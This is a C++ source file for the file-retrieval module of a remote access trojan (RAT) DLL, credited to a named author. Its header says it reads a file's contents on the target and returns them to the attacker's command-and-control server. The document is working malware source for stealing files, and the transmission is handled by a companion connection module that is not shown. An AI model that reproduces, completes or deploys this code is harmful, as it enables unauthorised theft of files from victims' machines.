// Patrick Sacchet (@pjsacchet)
// Verison 1.0.
// RAT-Dll-GetFile.cpp : Defines functionality for performing a file get on target, i.e., retrieving a buffer of file contents and sending it back to our C2 server

#include "RAT-Dll-Connect.h"
#include "RAT-Dll-GetFile.h"

/*TODO: Add ability to start at offset within file
		Add ability to chunk data we send back
		Check fiel size output parameter bytes*/


/** This function will perform a simple get file for us 
params:
* filePath - path to the file we're getting
* fileBytes - pointer to buffer containing file bytes we got from our target file 
* bufferSize - size of the output file buffer 
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately 
*/
INT performGetFile(__in const char* filePath, __out char** fileBytes, __out DWORD* bufferSize)
{
	INT status = SUCCESS;
	HANDLE hFile;
	DWORD dwBytesRead = 0;
	CHAR msgBuf[DEFAULT_BUF_LEN], *fileContents = NULL;
	LARGE_INTEGER fileSize; 

	hFile = CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		OutputDebugStringA("RAT-Dll-GetFile::performGetFile - Failure from CreateFileA (INVALID_HANDLE_VALUE)");
		status = FAILURE;
		goto cleanup;
	}

	// Get file details first prior to reading it so we can get the whole size of the file 
	if (!GetFileSizeEx(hFile, &fileSize))
	{
		sprintf_s(msgBuf, "RAT-Dll-GetFile::performGetFile - Failure from GetFileSizeEx %d\n", GetLastError());
		OutputDebugStringA(msgBuf);
		status = GetLastError();
		goto cleanup;
	}

	// Allocate for our file buffer
	 fileContents = (char*)malloc(fileSize.QuadPart * sizeof(char));
	if (fileContents == NULL)
	{
		OutputDebugStringA("RAT-Dll-GetFile::performGetFile - Failure from malloc (NOT ENOUGH MEMORY)");
		status = FAILURE;
		goto cleanup;
	}

	// These data sizes dont technically match up so fix this later...
	*bufferSize = fileSize.QuadPart;

	// Now note the size and read the file 
	if (!ReadFile(hFile, fileContents, fileSize.QuadPart, &dwBytesRead, NULL))
	{
		sprintf_s(msgBuf, "RAT-Dll-GetFile::performGetFile - Failure from ReadFile %d\n", GetLastError());
		OutputDebugStringA(msgBuf);
		status = GetLastError();
		goto cleanup;
	}
	
	*fileBytes = fileContents;

	// Normal Windows app will close the handle to the file
	if (!CloseHandle(hFile))
	{
		printf_s(msgBuf, "RAT-Dll-GetFile::performGetFile - Failure from CloseHandle %d\n", GetLastError());
		OutputDebugStringA(msgBuf);
		status = GetLastError();
		goto cleanup;
	}

	OutputDebugStringA("RAT-Dll-GetFile::performGetFile - Successfully got file from target! \n");

cleanup:
	return status;
}